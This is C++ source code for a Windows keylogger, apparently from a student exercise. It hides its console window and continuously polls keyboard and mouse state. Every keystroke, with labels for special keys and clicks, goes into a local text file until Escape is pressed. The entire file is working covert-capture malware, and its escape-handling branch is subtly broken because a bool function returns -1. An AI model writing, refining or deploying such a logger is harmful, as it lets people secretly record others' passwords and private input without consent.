#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>

using namespace std;

// init variables
string logfile = "C:\\Users\\hleatherwood_2023\\Desktop\\csc\\key\\log.txt";
bool recording = true;
char KEY;

// log function for nonstandard keys
void LOG(string input) {
    fstream LogFile;
    LogFile.open(logfile, fstream::app);
    if (LogFile.is_open()) {
        LogFile << input;
        LogFile.close();
    }
}

// handle special keys
bool SpecialKeys(int S_Key) {
    switch (S_Key) {
    case VK_SPACE:
        LOG(" ");
        return 1;
    case VK_RETURN:
        LOG("\n");
        return 1;
    case VK_OEM_PERIOD:
        LOG(".");
        return 1;
    case VK_SHIFT:
        LOG("[SHIFT]");
        return 1;
    case VK_BACK:
        LOG("[b]");
        return 1;
    case VK_RBUTTON:
        LOG("[R_CLICK]");
        return 1;
    case VK_LBUTTON:
        LOG("[L_CLICK]");
        return 1;
    case VK_CAPITAL:
        LOG("[CAPS_LOCK]");
        return 1;
    case VK_TAB:
        LOG("[TAB]");
        return 1;
    case VK_UP:
        LOG("[UP]");
        return 1;
    case VK_DOWN:
        LOG("[DOWN]");
        return 1;
    case VK_LEFT:
        LOG("[LEFT]");
        return 1;
    case VK_RIGHT:
        LOG("[RIGHT]");
        return 1;
    case VK_CONTROL:
        LOG("[CTRL]");
        return 1;
    case VK_MENU:
        LOG("[ALT]");
        return 1;
    case VK_ESCAPE:
        recording = false;
        return -1;
    default:
        return 0;
    }
}

// main - start logging
int main() {
    // hide the window
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // record keys and write to file
    while(recording) {
        Sleep(10);
        for(int KEY = 8; KEY <= 190; KEY++) {
            if(GetAsyncKeyState(KEY) == -32767) {
                int state = SpecialKeys(KEY);
                if(state == 0) {
                    fstream LogFile;
                    LogFile.open(logfile, fstream::app);
                    if(LogFile.is_open()) {
                        LogFile << char(KEY);
                        LogFile.close();
                    }
                } else if(state == -1) {
                    // quit on escape
                    break;
                }
            }
        }
    }

    return 0;
}